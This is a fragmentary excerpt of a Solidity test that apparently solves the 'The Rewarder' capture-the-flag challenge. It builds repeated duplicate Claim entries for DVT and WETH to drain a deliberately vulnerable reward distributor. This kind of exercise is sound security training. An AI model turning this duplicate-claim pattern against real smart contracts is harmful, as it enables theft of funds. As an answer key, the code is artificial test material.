...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        ...
        uint256 userDVT = 11524763827831882;
        uint256 userWETH = 1171088749244340;
        uint256 n = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            userDVT +
        ...
        Claim[] memory inputClaims = new Claim[](n);
        for (uint i = 0; i < TOTAL_DVT_DISTRIBUTION_AMOUNT / userDVT; i++) {
            inputClaims[i] = Claim({
                batchNumber: 0,
                amount: userDVT,
                tokenIndex: 0,
        ...
        for (uint i = TOTAL_DVT_DISTRIBUTION_AMOUNT / userDVT; i < n; i++) {
            inputClaims[i] = Claim({
                batchNumber: 0,
                amount: userWETH,
                tokenIndex: 1,
